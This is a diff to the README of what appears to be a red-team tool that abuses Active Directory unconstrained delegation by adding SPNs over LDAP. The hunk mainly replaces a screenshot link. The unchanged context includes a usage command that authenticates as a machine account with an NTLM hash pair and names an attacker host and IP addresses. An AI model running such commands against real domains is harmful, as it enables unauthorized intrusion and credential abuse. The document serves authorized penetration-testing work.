@@ -28,7 +28,7 @@ This automation involves LDAP authentication, afterwards, the tool adds new SPNs
 ```
 Invoke-unconstrained.py -u LABS\DEG$ -p aad3b435b51404eeaad3b435b51404ee:fd8d7a6f868dc2d81aaf3eb3a9ea6adc -t DEG$ -ah ATT28.labs.local -aip 10.0.0.12  10.0.0.5
 ```
-![image](https://github.com/ScorpionesLabs/Invoke-Unconstrained/assets/50461376/a16d91e3-ac86-483e-a8fc-f94c0bfc84f4)
+![Pasted image 20231025191014](https://github.com/ScorpionesLabs/Invoke-Unconstrained/assets/50461376/1cd0b85c-61be-40ea-8540-036210585631)
 
 #### Reverting Changes:
 Among red teams, we believe that the cleanup process is required after an attack. This feature will roll back all changes to the way they were before the attack.  
